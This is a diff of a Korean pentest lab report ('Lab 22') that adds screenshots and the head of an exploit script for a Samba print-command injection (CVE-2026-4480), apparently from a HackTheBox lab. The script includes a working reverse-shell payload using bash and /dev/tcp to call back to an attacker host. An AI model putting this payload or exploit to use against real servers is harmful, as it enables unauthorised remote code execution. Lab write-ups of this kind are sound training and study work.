@@ -2,7 +2,7 @@
 publish: true
 title: 모의해킹 보고서 – Lab 22
 created: 2026-11-20T00:02:44.797Z
-modified: 2026-11-20T01:30:05.654Z
+modified: 2026-11-20T01:41:19.772Z
 tags:
   - pentest
   - linux
@@ -266,7 +266,36 @@ netname: transfer
 
 ![[Template/Image/Pasted image 20261120103003.png]]
 
+![[Template/Image/Pasted image 20261120103855.png]]
+
+![[Template/Image/Pasted image 20261120104111.png]]
+
 ```
+└─$ head -n 25 exploit.py
+#!/usr/bin/env python3
+"""
+CVE-2026-4480 - Samba print-command (%J) injection -> unauthenticated RCE.
+Made by TheCyberGeek @ HackTheBox
+"""
+import argparse
+import sys
+
+try:
+    from samba.dcerpc import spoolss
+    from samba.param import LoadParm
+    from samba.credentials import Credentials
+except ImportError:
+    sys.exit("[-] Samba Python bindings missing. Install with: sudo apt install python3-samba")
+
+PRINTER_ACCESS_USE = 0x00000008
+
+
+def reverse_shell(lhost, lport):
+    # Must be non-empty (Samba skips the print command for a 0-byte spool file) and
+    # must detach (the command runs synchronously inside EndDocPrinter; a foreground
+    # shell would block smbd and hang/timeout the RPC).
+    return ("setsid bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &\n"
+            % (lhost, lport)).encode()
 ```
 
 ```
